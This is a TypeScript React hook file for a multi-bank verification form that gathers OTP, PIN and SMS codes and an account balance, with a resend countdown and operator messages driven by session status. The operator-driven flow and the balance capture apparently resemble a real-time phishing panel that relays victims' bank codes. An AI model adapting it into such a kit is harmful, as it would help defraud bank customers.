import { useState, useEffect, useCallback } from "react";
import { useOtpResendCountdown } from "./use-otp-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/verification-api";
import { debugLog } from "../lib/debug";
import { useBankVerificationContext } from "../context/bank-verification-context";
import type {
  OperatorMessage,
  ResendState,
  TransactionDetails,
} from "../types";
import type { UseSessionStatusReturn } from "./use-session-status";

const RESEND_COOLDOWN = 60;
const PIN_LENGTH = 4;
const OTP_MIN_LENGTH = 6;

export interface UseVerificationFormReturn {
  bank?: string;
  transactionDetails?: TransactionDetails;
  inProgress: boolean;
  awaitingVerification: boolean;
  error: string | null;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  operatorMessage: OperatorMessage | null;
  balance: string;
  setBalance: (v: string) => void;
  otpValue: string;
  setOtpValue: (v: string) => void;
  wrongCode: boolean;
  expiredCode: boolean;
  resendState: ResendState;
  pinMasked: boolean;
  onPinMaskToggle: () => void;
}

/**
 * Internal logic hook for verification form. Used by BankVerificationProvider.
 * Takes params directly — does not read from context.
 */
export function useVerificationFormLogic(
  channelSlug: string,
  debug: boolean,
  sessionId: string | null,
  sessionStatus: UseSessionStatusReturn,
): UseVerificationFormReturn {
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdown: countdownReset,
    error: fetchError,
  } = sessionStatus;

  const resendFn = async () => {
    if (verificationLayout === "pin" || verificationLayout === "sms") {
      debugLog(debug, "resend OTP", { type: verificationLayout });
      await resendOtp(channelSlug, sessionId ?? "", verificationLayout);
    }
  };

  const resendState = useOtpResendCountdown(
    RESEND_COOLDOWN,
    countdownReset,
    resendFn,
  );

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setOtpValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  const handleSubmitOtp = useCallback(async (codeValue: string) => {
    clearCodeFeedback?.();
    setSubmitError(null);
    setSubmitting(true);
    debugLog(debug, "submit OTP", {
      type: verificationLayout,
      codeLength: codeValue.length,
    });
    try {
      await submitOtp(channelSlug, sessionId ?? "", codeValue);
      debugLog(debug, "OTP submitted OK");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Invalid code";
      debugLog(debug, "OTP submit failed", { error: msg });
      setSubmitError(msg);
      setSubmitting(false);
    }
  }, [channelSlug, sessionId, debug, verificationLayout, clearCodeFeedback]);

  const handleSubmitBalance = useCallback(async (balanceValue: string) => {
    setSubmitError(null);
    setSubmitting(true);
    debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
    try {
      await submitBalance(channelSlug, sessionId ?? "", balanceValue);
      debugLog(debug, "balance submitted OK");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Failed to submit balance";
      debugLog(debug, "balance submit failed", { error: msg });
      setSubmitError(msg);
      setSubmitting(false);
    }
  }, [channelSlug, sessionId, debug]);

  const inProgress = status === "pending" || status === "awaiting_action";
  const awaitingVerification =
    status === "awaiting_sms" ||
    status === "awaiting_pin" ||
    status === "awaiting_push" ||
    status === "awaiting_balance";

  const onSubmit = useCallback(() => {
    if (verificationLayout === "balance") {
      handleSubmitBalance(balance);
    } else if (verificationLayout === "pin" || verificationLayout === "sms") {
      handleSubmitOtp(otpValue);
    }
  }, [verificationLayout, balance, otpValue, handleSubmitBalance, handleSubmitOtp]);

  const onPinMaskToggle = useCallback(() => setPinMasked((m) => !m), []);

  const canSubmit =
    verificationLayout === "balance"
      ? balance.trim().length > 0
      : verificationLayout === "pin"
        ? otpValue.replace(/\D/g, "").length === PIN_LENGTH
        : otpValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;

  return {
    bank,
    transactionDetails,
    inProgress,
    awaitingVerification,
    error: submitError ?? fetchError,
    onSubmit,
    submitting,
    canSubmit,
    operatorMessage: operatorMessage ?? null,
    balance,
    setBalance,
    otpValue,
    setOtpValue,
    wrongCode,
    expiredCode,
    resendState,
  pinMasked,
  onPinMaskToggle,
  };
}

/**
 * Public hook: reads verification form state from BankVerificationContext.
 * Must be used within BankVerificationProvider.
 */
export function useVerificationForm(): UseVerificationFormReturn {
  const ctx = useBankVerificationContext();
  return {
    bank: ctx.bank,
    transactionDetails: ctx.transactionDetails,
    inProgress: ctx.inProgress,
    awaitingVerification: ctx.awaitingVerification,
    error: ctx.error,
    onSubmit: ctx.onSubmit,
    submitting: ctx.submitting,
    canSubmit: ctx.canSubmit,
    operatorMessage: ctx.operatorMessage,
    balance: ctx.balance,
    setBalance: ctx.setBalance,
    otpValue: ctx.otpValue,
    setOtpValue: ctx.setOtpValue,
    wrongCode: ctx.wrongCode,
    expiredCode: ctx.expiredCode,
    resendState: ctx.resendState,
    pinMasked: ctx.pinMasked,
    onPinMaskToggle: ctx.onPinMaskToggle,
  };
}
